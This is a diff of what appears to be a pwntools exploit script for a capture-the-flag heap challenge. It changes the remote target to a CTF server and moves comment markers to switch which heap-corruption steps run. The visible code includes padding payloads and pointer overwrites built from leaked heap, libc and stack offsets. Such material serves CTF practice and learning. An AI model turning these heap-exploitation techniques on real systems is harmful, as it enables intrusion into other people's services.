@@ -1,10 +1,10 @@
 from pwn import *
 
 #s = remote('45.32.49.167',1234)
-s = remote('35.187.198.163', 31259)
+#s = remote('35.187.198.163', 31259)
 #s = remote('192.168.0.85',1234)
-s.recvuntil('num:')
-s.send('100\n')
+#s = remote('10.1.1.10',1234)
+s = remote('ctf.ikeeper.kr', 32677)
 raw_input()
 def reg(name,number,birth):
   s.recvuntil('>')
@@ -44,6 +44,7 @@ reg('A'*0x8,'D'*0x8,'A'*0x8)
 reg('A'*0x8,'B'*0x8,'A'*0x8)
 reg('A'*0x8,'C'*0x8,'A'*0x8)
 
+'''
 reg('B'*0x28,'A'*0xc,'A'*0x18)
 reg('B'*0x8,'A'*0x8,'A'*0x8)
 reg('B'*0x8,'A'*0x8,'A'*0x8)
@@ -73,7 +74,6 @@ edit(11,3,p32(heap+0x4b0))
 
 edit(11,1,p32(heap+0x27c))
 edit(11,3,p32(libc+0x1ad8d8))
-'''
 reg('t'*0x28,'y'*0x28,'d'*0x28)
 reg('t'*0x20+p32(stack+0x48)+p32(libc+0x1010)+p32(libc+0x1040),'A'*0x28,'A'*0x28) 
 '''
